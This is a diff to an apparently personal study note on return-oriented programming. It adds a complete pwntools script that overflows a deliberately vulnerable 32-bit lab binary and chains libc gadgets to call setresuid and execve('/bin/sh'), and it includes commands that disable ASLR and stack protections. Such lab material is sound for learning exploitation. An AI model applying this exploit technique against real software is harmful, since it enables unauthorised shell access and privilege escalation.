@@ -2,7 +2,7 @@
 - https://tc.gts3.org/cs6265/tut/tut06-01-rop.html
 - https://github.com/pwndbg/pwndbg/blob/dev/FEATURES.md#rop-gadgets
 - https://qiita.com/Koukyosyumei/items/89cf4d061cbe405e56b6
-# Example (TODO: 作りかけ)
+# Example
 ```c
 // gcc -m32 -fno-stack-protector -D_FORTIFY_SOURCE=0 -z execstack -no-pie -o chall chall.c
 // sudo bash -c 'echo 0 >/proc/sys/kernel/randomize_va_space'
@@ -72,7 +72,53 @@ Saved corefile /tmp/tmp54twxftw
 0xf7fd7303 : pop esi ; pop edi ; pop ebp ; ret 8
 ```
 
-## explot1.py
+## exploit1.py
+```python
+#!/usr/bin/env python3
+from pwn import *
+exe = context.binary = ELF(args.EXE or './chall')
+def start(argv=[], *a, **kw):
+    '''Start the exploit against the target.'''
+    if args.GDB:
+        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
+    else:
+        return process([exe.path] + argv, *a, **kw)
+gdbscript = '''
+tbreak main
+tbreak *buf+45
+continue
+'''.format(**locals())
+# int execve(const char *pathname, char *const argv[], char *const envp[]);
+# ebx: arg1("/bin/sh"), ecx: arg2(NULL), edx: arg3(NULL)
+elf_libc = ELF('/lib/i386-linux-gnu/libc.so.6')
+rop = ROP(elf_libc)
+libc_base = 0xf7d79000
+rop.raw(rop.find_gadget(['pop eax', 'ret'])[0] + libc_base)
+rop.raw(0xb) # syscall# of execve
+rop.raw(rop.find_gadget(['pop ebx', 'ret'])[0] + libc_base)
+rop.raw(next(elf_libc.search(b'/bin/sh\x00')) + libc_base)
+rop.raw(rop.find_gadget(['pop ecx', 'pop edx', 'ret'])[0] + libc_base)
+rop.raw(0x0)
+rop.raw(0x0)
+rop.raw(rop.find_gadget(['int 0x80'])[0] + libc_base)
+log.info(rop.dump())
+io = start()
+payload = (
+    b'A' * 0x88 +
+    b'BBBB' + # saved ebp
+    # int setresuid(uid_t ruid, uid_t euid, uid_t suid);
+    p32(elf_libc.symbols['setresuid'] + libc_base) +
+    p32(rop.find_gadget(['pop ebx', 'pop esi', 'pop edi', 'ret'])[0] + libc_base) +
+    p32(1001) +
+    p32(1001) +
+    p32(1001) +
+    rop.chain()
+)
+io.sendline(payload)
+io.interactive()
+```
+
+## explot2.py (作りかけ)
 ```python
 #!/usr/bin/env python3
 from struct import pack
